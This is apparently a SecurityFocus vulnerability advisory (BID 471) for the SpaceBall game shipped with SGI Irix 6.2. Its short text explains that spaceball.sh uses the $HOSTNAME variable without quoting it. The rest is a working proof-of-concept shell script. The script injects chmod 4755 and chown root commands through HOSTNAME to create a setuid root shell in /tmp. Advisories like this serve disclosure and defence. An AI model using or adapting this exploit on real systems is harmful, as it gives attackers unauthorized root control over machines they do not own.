source: http://www.securityfocus.com/bid/471/info

The SpaceBall game, shipped with Irix 6.2 from Silicon Graphics contains a security hole which could result in the compromise of the root account. By blindly taking the contents of the $HOSTNAME variable, and not placing quotes around it, the spaceball.sh program can be made to execute commands.

#!/bin/sh
SWDIR=/usr/local/SpaceWare
cp /bin/sh /tmp/sh
echo 6 | HOSTNAME="/bin/chmod 4755 /tmp/sh" $SWDIR/spaceball > /dev/null 2>&1
echo 6 | HOSTNAME="/bin/chown root /tmp/sh" $SWDIR/spaceball > /dev/null 2>&1
/tmp/sh

